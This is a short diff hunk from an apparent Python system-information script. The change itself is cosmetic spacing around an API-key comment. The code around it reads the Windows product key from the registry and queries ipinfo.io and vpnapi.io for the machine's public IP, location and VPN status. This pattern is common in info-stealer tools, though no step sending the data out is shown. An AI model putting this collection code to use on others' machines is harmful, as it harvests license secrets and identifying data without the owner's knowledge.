@@ -67,7 +67,9 @@ Path = winreg.HKEY_LOCAL_MACHINE
 ProductKeyPath = winreg.OpenKeyEx(Path, r"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SoftwareProtectionPlatform")
 ProductKey = winreg.QueryValueEx(ProductKeyPath, "BackupProductKeyDefault")
 ipinfo = json.loads(requests.get('http://ipinfo.io/json').text)
-vpnapiio_key = "" #             API key from vpnapi.io
+
+vpnapiio_key = "" # API key from vpnapi.io
+
 vpninfo = json.loads(requests.get(f"https://vpnapi.io/api/{ipinfo['ip']}?key={vpnapiio_key}").text)
 
 #full information of system
